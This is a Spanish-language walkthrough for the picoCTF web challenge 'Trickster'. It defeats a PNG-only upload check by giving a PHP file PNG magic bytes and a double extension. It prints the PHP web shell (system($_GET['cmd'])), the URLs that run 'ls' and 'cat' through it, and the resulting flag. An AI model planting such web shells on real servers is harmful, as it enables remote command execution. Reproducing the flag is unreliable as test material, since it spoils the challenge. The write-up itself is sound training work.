## Reto: Trickster
### Descripción
Encontré una aplicación web que puede ayudar a procesar imágenes: ¡solo imágenes PNG!Pruébalo [aquí](http://atlas.picoctf.net:50854/)¡!
### Solución
Vemos que solo podemos subir archivos con extension.png, segun la pagina, pero que pasa si nosotros creamos un archivo `php`para poder manipular comandos?

Guardaremos el siguiente script como `.php` y con el comando 
```shell
MV image.php image.png.php
```

Para poder confundir a la pagina:

```php
PNG
<?
if(isset($_GET['cmd'])){
	system($_GET['cmd']);
}
?>
```

Usando `png` al inicio, podremos lograr esto. 

Una vez ahi, sobre la barra de navegacion podemos ejecutar comandos:

```http
http://atlas.picoctf.net:50854/uploads/img.png.php?cmd=ls%20..
```

Con este comando nosotros podemos ver lo que hay en la carpeta anterior a la que nos encontramos, arrojandonos el siguiente resultado:
```
PNG HFQWKODGMIYTO.txt index.php instructions.txt robots.txt uploads
```

La bandera esta en el archivo `HFQWKODGMIYTO.txt`, asi que con el siguiente comando lo abrimos:
```http
http://atlas.picoctf.net:50854/uploads/img.png.php?cmd=cat%20../HFQWKODGMIYTO.txt
```

Y nos regresa la bandera:
```flag
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}
```



### Notas adicionales
### Referencias

